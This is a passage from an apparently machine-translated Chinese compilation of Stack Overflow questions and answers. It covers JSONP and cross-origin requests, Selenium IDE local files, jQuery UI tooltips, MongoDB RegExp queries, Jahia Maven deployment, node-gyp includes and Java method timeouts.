    }
}; 
```

使用镀铬显示：

```
XMLHttpRequest cannot load xxxx Origin xx is not allowed by Access-Control-Allow-Origin. 
```

谁能帮我？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T12:46:51.477

发出 ajax 请求并`JSON.parse`在结果上使用。就像是：

```
xhr = new XMLHttpRequest;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        JSON.parse(xhr.responseText);
    }
}
xhr.open("GET", url)
xhr.send(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:57:52.930

我得到它：

```
var $ = {
    getJSON: function(url, params, callbackFuncName, callback){
        var paramsUrl ="",
            jsonp = this.getQueryString(url)[callbackFuncName];
        for(var key in params){
            paramsUrl+="&"+key+"="+encodeURIComponent(params[key]);
        }
        url+=paramsUrl;
        window[jsonp] = function(data) {
            window[jsonp] = undefined;
            try {
                delete window[jsonp];
            } catch(e) {}

            if (head) {
                head.removeChild(script);
            }
            callback(data);
        };

        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.charset = "UTF-8";
        script.src = url;
        head.appendChild(script);
        return true;
    },
    getQueryString: function(url) {
        if(url){
            url = url.split("?")[1];
        }
        var result = {}, queryString = url || location.search.substring(1),
            re = /([^&=]+)=([^&]*)/g, m;
        while (m = re.exec(queryString)) {
            result[decodeURIComponent(m[1])] = decodeURIComponent(m[2]);
        }
        return result;
    }
}; 
```

调用演示：

```
var url = "http://xxx.xxx.xxx?callback=jsonp123";
var params = {
    a:1,
    b:2
};
$.getJSON(url, params, "callback", function(data){
    //todo
}); 
```

# file - Selenium IDE - 用于测试的本地（非网络托管）文件访问？

> ID：16215062
> 
> 赞同：2
> 
> 时间：2013-04-25T12:41:16.490
> 
> 标签：file, selenium-ide

**我的问题**

当 Selenium IDE 用于运行测试时，“基本 URL”总是通过某些 Web 服务器上的 http 访问。

我需要知道是否（以及如何）让 Selenium IDE 对本地存储的文件运行测试。在 Firefox 中打开文件时，地址栏中的路径如下所示：file:///C:/Documents and Settings/username/My Documents/somehtml.html

但是，当我将此路径放在 Selenium IDE 的 Base URL 字段中进行测试时，Selenium 会出现严重错误（请参阅我的帖子底部）。

**我试过的**

我运行 Windows XP 并尝试将文件路径斜杠切换为反斜杠，同时保持协议 (file:///) 斜杠不变。我也尝试用 %20 替换空格。

我还考虑了我的 Firefox 代理设置是否可能导致问题，但这并不是因为如果我在 Firefox 中打开文件，它会毫无问题地这样做。

我正在研究的解决方案是在此阶段避免使用 Selenium WebDriver。我知道它在技术上更好，但有实际原因我现在不能使用它。现在必须使用 Selenium IDE。

**错误**

尝试打开本地文件时抛出错误：

> [错误] 意外异常：名称 -> NS_ERROR_FAILURE，QueryInterface -> function QueryInterface() { [native code] }，消息 -> 组件返回失败代码：0x80004005 (NS_ERROR_FAILURE) [nsIDOMLocation.href]，结果 -> 2147500037，文件名 - > chrome://selenium-ide/content/selenium-core/scripts/selenium-browserbot.js, lineNumber -> 686, columnNumber -> 0, location -> JS 框架 :: chrome://selenium-ide/content/ selenium-core/scripts/selenium-browserbot.js :: BrowserBot.prototype.setOpenLocation :: line 686, 内部 -> null, data -> null, 初始化 -> function initialize() { [native code] }

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-28T19:38:46.210

打开`about:config`然后更改`security.fileuri.strict_origin_policy`为`false`. 请享用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-12T13:43:26.747

我遇到过同样的问题。刚刚解决了。方法如下：

1.  删除基本网址。
2.  在命令中输入 open 或 openWindow
3.  在目标中输入文件 url，例如 file:///C:/temp/junk/SomeSiteAutomation/ABC.htm

在 FF 26 和 Selenium 2.5 上为我工作

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T06:52:12.760

一种解决方案是使用 open 命令作为测试的第一行，并将本地路径设置为目标。这对于少数测试来说很好，但对于更大的测试套件可能还不够。

```
command: open
target: file///c:/path/to/your/file.html 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-01-13T18:14:04.567

打开 Selenium IDE - chrome 扩展一旦我们打开它就会询问项目名称和项目 url - 只需取消它转到 selenium IDE

[![在此处输入图像描述](https://i.stack.imgur.com/IPmoB.png)](https://i.stack.imgur.com/IPmoB.png)

在 selenium IDE - 在“命令”文本框中选择“目标”文本框中的“打开”输入示例 html 文件的路径，如下所示“file:///D:/index2.html” 然后这将显示在命令中selenium ide 的、目标和值列。现在只需运行测试。这将打开本地 html 文件

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-04-14T16:10:38.190

右键单击浏览器窗口右上角的 Selenium IDE 图标。从上下文菜单中选择“管理扩展”。在设置对话框中切换“允许访问文件 URL”。

这适用于 Chrome/Windows 10 和 Selenium IDE 版本 3.17.0。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-11-22T16:08:44.787

我遇到了同样的问题。我使用的是 Ubuntu 和 apache，但在 Windows 上你也可以这样做。

1.  将您的*index.html*移动到`/var/www/html`（默认情况下 localhost 指向此文件夹）
2.  在 selenium ide 中使用*http://127.0.0.1作为 base_url*

# qt - Gtk-WARNING **: gtk_disable_setlocale() 必须在 gtk_init() 之前调用

> ID：16215063
> 
> 赞同：4
> 
> 时间：2013-04-25T12:41:17.043
> 
> 标签：qt, ubuntu, opencv, gtk

每当我将 OpenCV`cv::imshow`与 Qt 一起使用时`QApplication`，我都会收到此错误：

```
Gtk-WARNING **: gtk_disable_setlocale() must be called before gtk_init() 
```

我进行了一些搜索，最终阅读了越来越多关于我不完全理解的内容，但对 OpenCV 和 GTK+ 的连接方式有所了解。而且由于警告显然是在某事之前调用某事的指令，因此我包含`gtk.h`并调用`gtk_disable_setlocale()`了 ，但最终出现了更多错误。

尽管有警告，但我的代码运行没有任何问题，但它真的让我很烦恼！我假设在警告背后，程序员应该理解一些基本的东西。所以也许有人可以用高级新手可以理解的方式解释整个事情？;)

**编辑：** 我正在使用 ubuntu 12.10、OpenCV 2.4、GTK 2.24.13 并`qmake -v`告诉我

```
QMake version 2.01a 
Using Qt version 4.8.3 in /usr/lib/x86_64-linux-gnu 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:24:32.990

如果你打算使用 Qt 窗口系统，最好避免在 Qt 窗口旁边创建 OpenCV 窗口。

**在 Qt 窗口上转换`IplImage`或`cv::Mat``QImage`**绘制。[检查 cvImage](https://github.com/karlphillip/GraphicsProgramming/tree/master/cvImage)，这是一个简单的 Qt/OpenCV 示例，它在 Qt 窗口上显示使用 OpenCV 加载的图像，并且还显示基于鼠标坐标的像素的 RGB 值。

# jquery - 为什么我的 jQuery 工具提示不像 jQuery 工具提示？

> ID：16215064
> 
> 赞同：0
> 
> 时间：2013-04-25T12:41:18.047
> 
> 标签：jquery, jquery-ui, jquery-ui-tooltip

我正在展示另一个元素周期表，并且遇到了 jQuery UI 工具提示的问题。页面结束，没有 JavaScript 错误，在：

```
<script src="/js/vendor/jquery-1.8.2.min.js"></script>
<script src="/js/jquery-ui-1.10.2/ui/jquery-ui.js"></script>
 <script src="/js/jquery-ui-1.10.2/ui/jquery.ui.tooltip.js"></script>
<script>
    jQuery(document).tooltip();
</script> 
```

早些时候，它没有给出 JavaScript 错误，而是默认样式（黑色上的 Chrome 黄色，小字体）工具提示，这与[http://jqueryui.com/tooltip/](http://jqueryui.com/tooltip/)的 jQuery UI 演示中的工具提示不同（对于 td 和 td > 跨度）。现在它会显示屏幕内容一秒钟左右，然后将显示空白。

[http://JonathansCorner.com/periodic/content.html](http://JonathansCorner.com/periodic/content.html)有什么问题，我该如何修复它才能正常显示页面并显示 jQuery UI 的默认工具提示版本的工具提示？左上角有一个标题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:51:43.840

而不是你的脚本：

```
<script>
    jQuery(document).tooltip();
</script> 
```

试试这个脚本：

```
<script>
    $(function() {
        $(document).tooltip();
    });
</script> 
```

您也没有指定完整的`HTML`文档。您的`HTML`, `HEAD`,`BODY`等标签在哪里？添加这些后，我会将 jQuery 资产包含在该`HEAD`部分而不是页面底部。

看起来您还包含两次工具提示 javascript。在这些行中：

```
<script src="/js/jquery-ui-1.10.2/ui/jquery-ui.js"></script>
<script src="/js/jquery-ui-1.10.2/ui/jquery.ui.tooltip.js"></script> 
```

看起来您`jquery-ui.js`已经包含工具提示小部件，因此您不需要第二次包含`jquery.ui.tooltip.js`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:12:27.380

我用你的页面标记创建了这个小提琴。请注意，小提琴实际上会添加 html、head 和 body 标记......它似乎工作正常：fiddle.jshell.net/BBa4t

# iphone - 完全从 Facebook 注销

> ID：16215065
> 
> 赞同：2
> 
> 时间：2013-04-25T12:41:19.887
> 
> 标签：iphone, objective-c, facebook, ios6

我已经集成了 facebook SDK 并能够登录到 facebook。如果用户在 iOS 设置中启用了 facebook 帐户，则它会请求访问应用程序的权限，否则它会转到 safari 进行 facebook 登录并返回应用程序。对于注销，我使用了以下代码：

```
NSHTTPCookie *cookie;
NSHTTPCookieStorage *storage = [NSHTTPCookieStorage sharedHTTPCookieStorage];

for (cookie in [storage cookies])
{
    NSString* domainName = [cookie domain];
    NSRange domainRange = [domainName rangeOfString:@"facebook"];
    if(domainRange.length > 0)
    {
        [storage deleteCookie:cookie];
    }
}
   [FBSession.activeSession closeAndClearTokenInformation]; 
```

但它无法完全注销。如果我再次单击登录按钮，它仍然显示访问令牌，并且没有再次移动到 Safari 进行 facebook 登录，这意味着它还没有完全从 facebook 注销。我无法识别这个问题。如果有人知道这件事，请帮助我。

我会非常感谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T22:48:07.530

您使用的是 iOS 版 Facebook SDK 3.x 版吗？如果是这样，FBSession 类应该有一个名为的方法

```
-[FBSession closeAndClearTokenInformation] 
```

希望这对你有用。

# javascript - 如何将变量传递给正则表达式

> ID：16215066
> 
> 赞同：4
> 
> 时间：2013-04-25T12:41:20.670
> 
> 标签：javascript, regex, node.js, mongodb

我有这样的查找语句

```
collSession.find({"Venue.type": /.*MT.*/}).toArray(function (err, _clsSession)
        {
            console.log(_clsSession);
        }); 
```

它给出了答案。但我需要一些变量值而不是那个硬编码值 MT。如何做到这一点？谢谢。

**更新**我试过像 " */."+searchterm+"./* " 它不工作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T12:48:41.493

除了使用内联语法创建正则表达式，您还可以使用[RegExp](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/RegExp)对象创建基于字符串的正则表达式

```
var searchPhrase = "MT";
var regularExpression = new RegExp(".*" + searchPhrase + ".*");
collSession.find({"Venue.type": regularExpression}) [...] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T12:49:57.200

替换`/.*MT.*/`为`new RegExp( ".*" + variable + ".*" )`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T12:49:07.663

尝试这个：

```
 var pattern = 'concatenate string' + here,
        regexp = new Regexp(pattern); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T12:48:58.943

最后我[从这里得到](https://stackoverflow.com/questions/10728043/mongo-query-with-regex-in-node-js-operating-on-a-variable)

它是“Venue.type”：新 RegExp(queryParams.et)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-07-19T11:23:01.753

> 看看这段代码：（我用的是猫鼬）

```
exports.getSearchPosts = (req, res, next) => {
const keyword = req.body.keyword;
Post.find({ postTitle: new RegExp( ".*" + keyword + ".*" ) }).then(posts => {
    res.render('post/search', {
        pageTitle: 'Search result for: ' + keyword,
        posts: posts,
        category: postCategory,
        posts: catPost,
    });
 }).catch(err => console.log(err));
} 
```

**我想你会发现它很有帮助**

# java - maven-built 模块中的 Jahia6.6 部署错误

> ID：16215068
> 
> 赞同：2
> 
> 时间：2013-04-25T12:41:29.267
> 
> 标签：java, eclipse, maven, tomcat, deployment

我正在尝试为[Jahia](http://www.jahia.com/cms/home/download.html)网站开发模板集模块。

我使用了此处提供的官方文档中描述的分步过程：[http](http://www.jahia.com/cms/home/download/jahia-academy/documentation.default.html?displayTab=technical-documentation) ://www.jahia.com/cms/home/download/jahia-academy/documentation.default.html?displayTab=technical-documentation “**模板和集成指南**”。

基本上，它意味着使用 maven[原型](http://maven.jahia.org/maven2/archetype-catalog.xml)在服务器上初始化、构建和部署您的项目。前两个步骤已正确完成。它生成模块的骨架和强制文件。然后，我可以构建它来创建一个 .war 文件。

```
mvn archetype:generate -DarchetypeCatalog=http://maven.jahia.org/maven2    
>> [INFO] PROJECT GENERATED

mvn clean install
>> [INFO] BUILD SUCCESS 
```

但是在部署过程中出现错误。

```
mvn jahia:deploy
>> [INFO] BUILD FAILURE
>> [ERROR] Failed to execute goal org.jahia.server:maven-jahia-plugin:2.81:deploy (default-cli) on project test-template-set: 
>> Error while validating deployers:Factory not initialized properly, 
>> you must set the targetServerDirectory variable before calling getInstance ! -> [Help 1]
>> [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 
```

提供的[链接](https://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException)给了我一个不言自明的结论：

> 与许多其他错误不同，此异常不是由 Maven 核心本身生成的，而是由插件生成的。异常的具体含义取决于插件，因此请查看其文档。

因此，在使用 Jahia 文档中描述的标准程序后，我能找到的唯一建议就是仔细查看它。欢迎来到生活的第 22 条规则。

我正在使用 Jahia6.6.1.0 社区分发。我在 Jahia 论坛中没有找到更多线索。

我想知道我错过了哪一步。这是一个常见的 Maven 错误吗？还是只是缺少 Jahia 强制文件？找到“helloworld 工作模块”的线索也很棒。

这是错误的完整跟踪：

```
[INFO] Error stacktraces are turned on.
[INFO] Scanning for projects...
[INFO]
[INFO] ------------------------------------------------------------------------
[INFO] Building Test Cooptation template set 1.0-SNAPSHOT
[INFO] ------------------------------------------------------------------------
[INFO]
[INFO] --- maven-jahia-plugin:2.81:deploy (default-cli) @ test-template-set ---
[INFO] Jahia project structure version is 2
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 2.456s
[INFO] Finished at: Thu Apr 25 14:39:19 CEST 2013
[INFO] Final Memory: 12M/220M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.jahia.server:maven-jahia-plugin:2.81:deploy (default-cli) on project test-template-set: Error while validating deployers:
Factory not initialized properly, you must set the targetServerDirectory variabl
e before calling getInstance ! -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.jahia.server:maven-jahia-plugin:2.81:deploy (default-cli) on project test-template-set: Error while validating deployers
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:217)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
Caused by: org.apache.maven.plugin.MojoExecutionException: Error while validating deployers
        at org.jahia.utils.maven.plugin.DeployMojo.doValidate(DeployMojo.java:129)
        at org.jahia.utils.maven.plugin.AbstractManagementMojo.execute(AbstractManagementMojo.java:129)
        at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
        ... 19 more
Caused by: java.lang.RuntimeException: Factory not initialized properly, you must set the targetServerDirectory variable before calling getInstance !
        at org.jahia.configuration.deployers.ServerDeploymentFactory.getInstance(ServerDeploymentFactory.java:74)
        at org.jahia.utils.maven.plugin.DeployMojo.doValidate(DeployMojo.java:127)
        ... 22 more
[ERROR]
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR]
[ERROR] For more information about the errors and possible solutions, please rea
d the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-26T08:44:57.900

[先决条件 - Jahia](http://www.jahia.com/community/documentation/jahiapedia/development/module.html)提到我们至少应该调整到我们的 Apache Tomcat 应用程序服务器的目标路径，如果您将从源代码构建 Jahia 并部署它，数据库连接设置。

在 a 上`settings.xml`部署和使用的最小文件是：`Jahia``Tomcat``MySQL DBMS`

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<settings xmlns="http://maven.apache.org/SETTINGS/1.0.0"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0
                      http://maven.apache.org/xsd/settings-1.0.0.xsd">

    <localRepository>C:/development/m2repository</localRepository>

    <servers>
        <server>
            <id>jahiaRepository</id>
            <username>maven</username>
            <privateKey>C:/putty/maven.jahia.org.private</privateKey>
        </server>
    </servers>
    <profiles>
        <profile>
            <id>jahia-mysql</id>
            <properties>
                <jahia.configure.databaseType>mysql</jahia.configure.databaseType>
                <jahia.configure.databaseUrl>jdbc:mysql://localhost/jahia?useUnicode=true&amp;characterEncoding=UTF-8&amp;useServerPrepStmts=false</jahia.configure.databaseUrl>
                <jahia.configure.databaseUsername>root</jahia.configure.databaseUsername>
                <jahia.configure.databasePassword>password</jahia.configure.databasePassword>
            </properties>
        </profile>
        <profile>
            <id>jahia-tomcat</id>
            <properties>
                <jahia.deploy.targetServerType>tomcat</jahia.deploy.targetServerType>
                <jahia.deploy.targetServerDirectory>C:/development/apache-tomcat-6.0.32</jahia.deploy.targetServerDirectory>
                <jahia.deploy.targetServerVersion>6</jahia.deploy.targetServerVersion>
            </properties>
        </profile>
    </profiles>

    <activeProfiles>
        <activeProfile>jahia-mysql</activeProfile>
        <activeProfile>jahia-tomcat</activeProfile>
    </activeProfiles>

    <pluginGroups>
        <pluginGroup>org.jahia.server</pluginGroup>
    </pluginGroups>
</settings> 
```

我希望这可能会有所帮助。

# css - 具有块级输入的响应式分段下拉组

> ID：16215074
> 
> 赞同：0
> 
> 时间：2013-04-25T12:41:52.083
> 
> 标签：css, twitter-bootstrap, responsive-design

我正在使用引导框架来开发响应式酒店搜索页面。我需要一个带有块级输入的分段下拉组，如下图所示。

![我需要的示例图像](https://i.stack.imgur.com/czk9P.png)

在这里，输入将是全宽的，向左浮动到操作下拉菜单。文本“操作”是动态的，将根据用户从下拉列表中的选择而变化。所以下拉菜单的宽度可能会增加。

输入文本应仅从左侧开始到下拉菜单，并且也适合全宽。

我处理了这个静态，但是在进行响应式和下拉文本增加时，我遇到了很多宽度问题。

有谁知道如何实现这个？

高级感谢您的帮助..

编辑：这是一个 Js 小提琴：http: [//jsfiddle.net/surjithctly/mP8ab/](http://jsfiddle.net/surjithctly/mP8ab/)

HTML

```
<form class="bs-docs-example">
            <div class="input-prepend">
              <div class="btn-group" style="
    z-index: 1;
">
                <button class="btn" tabindex="-1">Action</button>
                <button class="btn dropdown-toggle" data-toggle="dropdown" tabindex="-1">
                  <span class="caret"></span>
                </button>
                <ul class="dropdown-menu">
                  <li><a href="#">Action</a></li>
                  <li><a href="#">Another action</a></li>
                  <li><a href="#">Something else here</a></li>
                  <li class="divider"></li>
                  <li><a href="#">Separated link</a></li>
                </ul>
              </div>
              <input type="text" class="input-block-level">
            </div>

          </form> 
```

# c# - Dialogs[XlBuiltInDialog.xlDialogPasteSpecial].Show 的参数是什么

> ID：16215076
> 
> 赞同：0
> 
> 时间：2013-04-25T12:42:03.050
> 
> 标签：c#, vsto, excel-2007

VSTO excel 的 pasteSpecial 对话框需要 30 个参数。我试过到处找，但找不到每个参数代表什么。

当对话框弹出时，我正在尝试为 pasteSpecial 设置默认值。(c#vsto2007)

```
bool isPaste = Globals.ThisAddIn.Application.Dialogs[XlBuiltInDialog.xlDialogPasteSpecial].Show
                (
                Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T14:12:59.427

根据this [MSDN](http://msdn.microsoft.com/en-us/library/office/bb211087%28v=office.12%29.aspx) page，有四个论点：

```
paste_num, operation_num, skip_blanks and transpose 
```

例如，这将显示选中 Transpose 的对话框：

```
bool isPaste = Globals.ThisAddIn.Application.Dialogs[XlBuiltInDialog.xlDialogPasteSpecial].Show
                    (Type.Missing, Type.Missing, Type.Missing, TRUE ... 
```

我相信其他 26 个参数是占位符，并且您选择的任何对话框都将指示 30 个参数。

# javascript - jqMobi 使用 ajax 数据动态更新元素

> ID：16215077
> 
> 赞同：1
> 
> 时间：2013-04-25T12:42:08.430
> 
> 标签：javascript, mobile, jqmobi

使用 jqmobi 1.2
我正在尝试使用 ajax 调用的结果更新面板的内容。以下面板将收集要搜索的字符串。

```
<div id="register_form" class="panel" data-defer="" data-header="default" data-footer="register_footer" data-load="" data-unload="">
<form id="register_data" class="selected">
   <fieldset class="scrollable" data-pull-scroller="true">
      <legend class="toggelable" >Organization:</legend>
         <div id=""class="toggelable">
            <label for="seleced_org"  >Bezeichnung:</label><br>  
               <input type="text" id="seleced_org" class="toggelable jq-ui-forms" ><br>
                  <a class="button icon magnifier" href="javascript:searchOrg();">Search</a>
          </div>
       </fieldset>
</form>
</div> 
```

该按钮将调用以下函数，其中成功方法将向面板添加 id 为“org_options”的元素。

阿贾克斯功能：

```
var FOUNDORGS = [];

function searchOrg() {
   var request = $('input[id=seleced_org]').val();
   $.ajax({
       url: mcTime.ASURL + "/OrgCheck",
       dataType: "JSONP",
       crossDomain: true,
       data: {
           maxRows: 12,
           name_startsWith: request,
           callback: ''
       },
       success: function(data) {
          /*
           * server response: [{"organisationId":1,"workerquantity":0,"name":"My_Org","street":"Org_Street 1","zipcode":"45454","city":"Org_City"}]
           */
           FOUNDORGS = $.parseJSON(data);    

           if ($('fieldset[name="options"]').find('.matchingOrgs').length == 0) {
               $('fieldset[name="options"]').append('<ul class="mc matchingOrgs"></ul>');
           }
           var toAppend = $('fieldset[name="options"]').find('.matchingOrgs')[0];
           $(toAppend).html('');
           for (var i = 0; i < FOUNDORGS.length; i++) {
               var obj = FOUNDORGS[i];
               var li = $('<li>\n\
                    <a class="orglink" href="javascript:showOrgDetail(\'' + obj.organisationId + '\',\'' + obj.name + '\');">' + obj.name + '</a>\n\
                    </li>');
               $(toAppend).append(li);
           }

           $.ui.loadContent('#org_options', false, false, 'slide');
       }
   });
 } 
```

附加的div：

```
<div id="org_options" class="panel" data-header="default" data-footer="register_footer" modal="false" data-unload="">
   <fieldset name="options" class="mc scrollable" data-pull-scroller="true">
      <legend >Results:</legend>
   </fieldset>
 </div> 
```

所有这些都可以在我的浏览器（chrome）和 XDK 模拟器上运行，但在我的 iPhone 上使用 XDK 应用程序测试器时却不行。

任何身体任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T19:33:11.523

我是 App Framework 的首席开发人员。iOS 容器中存在处理来自远程服务器的 JSON 数据的错误。[http://forums.html5m.com](http://forums.html5m.com)上有一些关于它的帖子。它在我们的错误跟踪系统内部记录。

谢谢，伊恩

# c++ - 带有 Boost 的 Node-gyp 包含和库目录

> ID：16215082
> 
> 赞同：10
> 
> 时间：2013-04-25T12:42:16.270
> 
> 标签：c++, node.js, boost, visual-studio-2012

我正在尝试在我的 Windows 7 机器上构建一个 Node C++ 插件，该插件使用 Boost 库中的一些类。但是，运行后

```
node-gyp configure 
```

成功地，当我运行时，我不断受到缺少头文件的攻击

```
node-gyp build 
```

与我包括的各种 Boost 标头有关。

我尝试在“配置”创建的 Visual Studio 项目中手动设置包含和库目录，但无济于事。

究竟如何为 node-gyp 定义包含目录？

[编辑] 在搞砸了 node-gyp 但收效甚微之后，我探索了通过 Visual Studio 构建 Node 模块，结果证明，几个小时后，它终于可以正常工作了。感谢您的帮助。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-25T14:03:14.253

您需要将它们添加到 binding.gyp 文件中：

```
'include_dirs': [
  '<some directory>',
],
'libraries': [
  '-l<some library>', '-L<some library directory>'
] 
```

# java - 方法超时

> ID：16215083
> 
> 赞同：0
> 
> 时间：2013-04-25T12:42:16.823
> 
> 标签：java, multithreading, timer

我的程序如下所示

1.  主程序（线程 1）
2.  创建多个简单的 java 线程（Thead 1.1、1.2...）
3.  在每个线程（1.1 或 1.2 ..）中，我正在做一些处理，同时调用一个有时没有响应的方法（CORBA 调用）。我想为这个方法定义计时器，线程（1.1 或 1.2 调用者）应该在那里等待，直到我得到响应或计时器过期。

我编写了以下示例程序。我不认为这是正确的方法。有没有更好的方法？在这个 prg 中，我不确定何时调用中断方法。

```
public class MethodTimeout implements Runnable{

/**
 * @param args
 */

public Thread t1 = null;
public int threadnum = 0;
public static void main(String[] args) {

    for (int i=0; i<3; i++){
        MethodTimeout mt  =new MethodTimeout();
        Thread t = new Thread(mt,"thread "+(i+1));
        mt.t1 = t;
        mt.threadnum = (i+1); 
        t.start();
    }

    System.out.println("stmt after execution");
}

public Object testTimeout(){
    long startTime = System.currentTimeMillis();
    try {

        System.out.println("in side method start "+t1.getName()+" start time"+startTime);

        Thread.sleep(5000);
    } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    long endtime = System.currentTimeMillis();
    System.out.println("in side method end "+t1.getName()+" total time"+(endtime-startTime) );
    return null;
}

@Override
public void run() {

    Thread timeout  = new Thread (){
        public void run() {
            testTimeout();
        };
    };
    timeout.start();

    try {
        Thread.sleep(2000);
        timeout.interrupt();
        Thread.sleep(2000);
    } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }       
    System.out.println(t1.getName() + " is ending");
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:51:52.077

This very much sounds like you should implement Callable. **This is just an example**

```
 import java.util.concurrent.Callable;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;

 public class Test {    
     public static void main(String[] args) throws Exception {
         ExecutorService service = Executors.newFixedThreadPool(2);
         Future<String> futureResult = service.submit(new MyCall());
             try{
                 String result = futureResult.get(20, TimeUnit.MILLISECONDS);
             } catch(TimeoutException timeout){
                  System.out.println("Timeout");
                  service.shutdownNow();
             }
   }

   static class MyCall implements Callable<String> {
        @Override
        public String call() throws Exception {
             try{
                  //Simulate some corba work
                  Thread.sleep(1000);
             }catch(InterruptedException e){
                  Thread.currentThread().interrupt();
                  System.out.println("Shutting down the task!");
             }
                 return "The result";
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-09T05:50:57.297

您还可以对@Eugene 的答案进行一个小改动，也就是说，`shutdownNow()`您`ExecutorService`可以只调用超时`cancel(true)`的，而不是调用本身。`futureResult`这是代码片段：

```
public class Test {    
     public static void main(String[] args) throws Exception {
         ExecutorService service = Executors.newFixedThreadPool(2);
         Future<String> futureResult = service.submit(new MyCall());
             try{
                 String result = futureResult.get(20, TimeUnit.MILLISECONDS);
             } catch(TimeoutException timeout){
                  System.out.println("Timeout");
             } finally {
                  futureResult.cancel(true);
             }
   } 
```

这只是为了确保只取消超时线程。除了`shutdownNow()`尝试停止当前正在执行的任务之外，还可以防止等待任务的启动。

# html - 宽度的导入字体问题

> ID：16215086
> 
> 赞同：0
> 
> 时间：2013-04-25T12:42:24.573
> 
> 标签：html, css, fonts

```
@font-face {
    font-family: 'BryantMedium';
    src:url('fonts/bryant-medium-webfont.eot');
    src:url('fonts/bryant-medium-webfont.eot?#iefix') format('embedded-opentype'),
        url('fonts/bryant-medium-webfont.svg#BryantMedium') format('svg'),
        url('fonts/bryant-medium-webfont.ttf') format('truetype');
    font-weight: normal;
    font-style: normal;
} 
```

这就是我导入字体的方式，这里是一个示例 div：

```
<div id="info">
by <span id="name">USERNAME</span> on <span id="date">24 Nov 2013</span>
</div> 
```

这是它最终的样子：

![图片](https://i.stack.imgur.com/lIhiS.png)

